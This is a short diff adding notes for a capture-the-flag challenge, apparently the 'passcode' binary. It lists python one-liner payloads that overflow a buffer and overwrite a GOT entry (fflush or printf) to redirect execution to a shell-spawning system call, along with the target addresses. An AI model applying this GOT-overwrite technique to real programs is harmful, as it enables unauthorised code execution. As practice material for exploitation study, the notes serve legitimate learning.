@@ -1,0 +1,13 @@
+**shellcode for passcode 
+
+payload1 (python -c "print 'a'*96 + '[GOT address of fflush()]' + '[system("bin/sh flag") address]'") | ./passcode
+payload2 (python -c "print 'a'*96 + '[GOT address of fflush()]' + '[system("bin/sh flag") address]'"; cat) | ./passcode
+payload3 (python -c "print 'a'*96 + '[GOT address of printf()]' + '[system("bin/sh flag") address]'"; cat) | ./passcode
+
+0x804a004 <fflush@got.plt>
+0x804a000 <printf@got.plt>
+0x080485ea <system@plt>
+
+(python -c "print 'a'*96 + '\x00\xa0\x04\x08' + '134514147'"; cat) | ./passcode
+
+payload1,2,3 all fine
